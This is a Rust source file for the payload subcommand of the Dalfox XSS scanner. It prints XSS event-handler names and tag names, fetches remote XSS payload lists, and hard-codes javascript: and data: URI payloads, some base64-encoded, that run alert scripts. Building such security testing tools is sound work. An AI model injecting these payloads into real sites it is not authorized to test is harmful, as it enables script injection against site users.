use clap::Args;

/// Manage or inspect payloads (no local flags).
///
/// Note:
/// - The legacy enum-* flags have been removed.
/// - This subcommand currently provides a brief summary only.
/// - Payload selection and application is handled by the scanning engine.
#[derive(Args, Debug, Clone)]
#[command(
    about = "Manage or inspect payloads",
    long_about = "Selectors:\n  - event-handlers: list all DOM event handler attribute names (e.g., onclick, onmouseover)\n  - useful-tags: list useful HTML tag names often used in XSS contexts (e.g., script, img, svg)\n  - payloadbox: fetch and print remote XSS payloads from PayloadBox\n  - portswigger: fetch and print remote XSS payloads from PortSwigger\n  - uri-scheme: print scheme-based XSS payloads (javascript:, data:, etc.)"
)]
pub struct PayloadArgs {
    #[arg(
        value_name = "SELECTOR",
        help = "Payload selector\nAvailable selectors:\n  - event-handlers\n  - useful-tags\n  - payloadbox\n  - portswigger\n  - uri-scheme",
        long_help = "Selector to enumerate payload resources.\nSupported selectors:\n  - event-handlers: print all DOM event handler attribute names (e.g., onclick, onmouseover)\n  - useful-tags: print useful HTML tag names used for XSS payloads (e.g., script, img, svg)\n  - payloadbox: fetch and print remote XSS payloads from PayloadBox\n  - portswigger: fetch and print remote XSS payloads from PortSwigger\n  - uri-scheme: print scheme-based XSS payloads (javascript:, data:, etc.)"
    )]
    pub selector: Option<String>,
}

fn fetch_and_print_remote(provider: &str) {
    let provider = provider.to_string();
    let join = std::thread::spawn(move || {
        let rt = tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build();
        match rt {
            Ok(rt) => {
                rt.block_on(async move {
                    let providers = vec![provider.clone()];
                    if let Err(e) = crate::utils::init_remote_resources(&providers, &[]).await {
                        eprintln!("[payload] failed to fetch from {}: {}", provider, e);
                        return;
                    }
                    if let Some(list) = crate::utils::get_remote_payloads() {
                        for p in list.iter() {
                            println!("{}", p);
                        }
                    } else {
                        eprintln!(
                            "[payload] no payloads initialized for provider {}",
                            provider
                        );
                    }
                });
            }
            Err(e) => {
                eprintln!("[payload] runtime init error: {}", e);
            }
        }
    });
    let _ = join.join();
}

pub fn run_payload(args: PayloadArgs) {
    match args.selector.as_deref() {
        Some("event-handlers") => {
            for ev in crate::payload::xss_event::common_event_handler_names().iter() {
                println!("{}", ev);
            }
        }
        Some("useful-tags") => {
            for t in crate::payload::xss_html::useful_html_tag_names().iter() {
                println!("{}", t);
            }
        }
        Some("payloadbox") => {
            fetch_and_print_remote("payloadbox");
        }
        Some("portswigger") => {
            fetch_and_print_remote("portswigger");
        }
        Some("uri-scheme") => {
            // print scheme-based XSS payloads
            println!("javascript:alert(1)");
            println!("data:text/html;,<svg/onload=alert(1)>");
            println!("data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoNDUpPg==");
            println!(
                "data:application/xml;base64,PGhhaHd1bDpzY3JpcHQgeG1sbnM6aGFod3VsPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1s"
            );
            println!("Jz5wcm9tcHQoNDUpPC9oYWh3dWw6c2NyaXB0Pg==");
            println!(
                "data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCIgaWQ9InhzcyI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2VjbWFzY3JpcHQiPmFsZXJ0KDQ1KTs8L3NjcmlwdD48L3N2Zz4="
            );
        }
        Some(other) => {
            eprintln!("Unknown selector: {}", other);
        }
        None => {
            // Provide a small, helpful summary rather than a no-op.
            let js_count = crate::payload::XSS_JAVASCRIPT_PAYLOADS.len();

            println!("Dalfox payload");
            println!("----------------");
            println!("Provide a selector to list payloads. Examples:");
            println!("  dalfox payload event-handlers");
            println!("  dalfox payload payloadbox");
            println!("  dalfox payload portswigger");
            println!("  dalfox payload uri-scheme\n");

            println!("Summary:");
            println!("- Canonical JavaScript payloads: {}", js_count);

            println!("\nTips:");
            println!("- Use scanning to apply payloads: dalfox scan <target>");
            println!("- Add your own payloads with: --custom-payload <file>");
            println!("- Only test custom payloads with: --only-custom-payload");
            println!("- Control encoder variants with: -e none,url,2url,html,base64");
        }
    }
}
